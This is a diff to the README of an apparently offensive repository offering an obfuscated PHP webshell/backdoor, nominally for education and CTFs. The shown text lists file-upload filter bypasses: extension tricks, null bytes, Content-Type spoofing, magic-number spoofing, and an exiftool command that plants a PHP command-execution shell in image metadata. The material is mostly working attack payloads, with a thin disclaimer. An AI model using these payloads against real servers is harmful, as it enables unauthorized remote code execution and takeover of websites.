@@ -1,7 +1,7 @@
 # Php-Webshell/Backdoor
 
 A PHP webshell created by us TermuxHackz Society.  For educational and/or testing purposes only. 
-Can also be used for ctf challenges. Our php webshell is obfuscated, which has uploader and main shell. (ths1335.php)
+Can also be used for ctf challenges, which has uploader and main shell. (ths1335.php)
 
 # Note
 #### [+] Always investigate malware in a secure environment. This means: separately from your network and in a virtual machine!
@@ -57,6 +57,7 @@ file.png.Php5
 </code>
 <br/>
 3) Try adding special characters at the end. You could use Burp to bruteforce all the ascii and Unicode characters. (Note that you can also try to use the previously motioned extensions) <br>
+<br>
 <code>
 file.php%20<br/>
 file.php%0a<br/>
@@ -70,6 +71,7 @@ file.pHp5...<br/>
 </code>
 <br>
 4) Try to bypass the protections tricking the extension parser of the server-side with techniques like doubling the extension or adding junk data (null bytes) between extensions. You can also use the previous extensions to prepare a better payload.<br/>
+<br>
 <code>
 file.png.php<br/>
 file.png.pHp5<br/>
@@ -107,6 +109,7 @@ AAA<--SNIP 232 A-->AAA.php.png
 
 <h2> Bypass Content-Type & magic number </h2>
 1) Bypass Content-Type checks by setting the value of the Content-Type header to: <b>image/png</b> , <b>text/plain</b> ,<b> application/octet-stream</b><br>
+<br>
 >> Content-Type wordlist: https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt <br>
 <br>
 2) Bypass magic number check by adding at the beginning of the file the bytes of a real image (confuse the file command). Or introduce the shell inside the metadata: <b>exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg </b>
